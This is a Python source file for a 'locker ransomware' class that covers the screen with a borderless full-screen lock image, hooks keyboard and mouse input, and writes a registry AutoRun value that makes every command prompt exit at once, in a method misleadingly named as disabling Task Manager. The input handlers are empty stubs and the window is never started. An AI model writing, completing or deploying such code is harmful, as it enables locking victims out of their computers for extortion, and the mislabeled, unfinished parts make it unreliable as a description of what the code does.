import os
import platform
from pynput.keyboard import Listener as KeyboardListener
from pynput.mouse import Listener as MouseListener
import tkinter as tk
from PIL import Image, ImageTk

class LockerRansomware:
    def __init__(self):
        self.screen_width = 1920
        self.screen_height = 1080
        self.os_version = platform.platform()
        self.disable_task_manager()
        self.overlay_window = None

    def disable_task_manager(self):
        os.system("reg add \"HKEY_CURRENT_USER\Software\Microsoft\Command Processor\" /v AutoRun /t REG_SZ /d exit")

    def create_overlay_window(self):
        root = tk.Tk()
        root.title("Locker Ransomware")
        screen_width, screen_height = self.screen_width, self.screen_height
        root.geometry(f"{screen_width}x{screen_height}")
        root.attributes("-fullscreen", True)
        root.overrideredirect(True)

        image_path = os.path.join(os.getcwd(), "lock_screen.png")  # Use an actual path to your lock screen image
        img = Image.open(image_path)
        photo_img = ImageTk.PhotoImage(img)
        label = tk.Label(root, image=photo_img)
        label.pack()

        self.overlay_window = root

    def listen_inputs(self):
        keyboard_listener = KeyboardListener(on_press=self.handle_keyboard_input)
        keyboard_listener.start()

        mouse_listener = MouseListener(on_click=self.handle_mouse_input)
        mouse_listener.start()

    def handle_keyboard_input(self, key):
        # Implement your logic for handling keyboard input
        pass

    def handle_mouse_input(self, x, y, button, pressed):
        # Implement your logic for handling mouse input
        pass

    def start(self):
        self.create_overlay_window()
        self.listen_inputs()

if __name__ == "__main__":
    ransomware = LockerRansomware()
    ransomware.start()
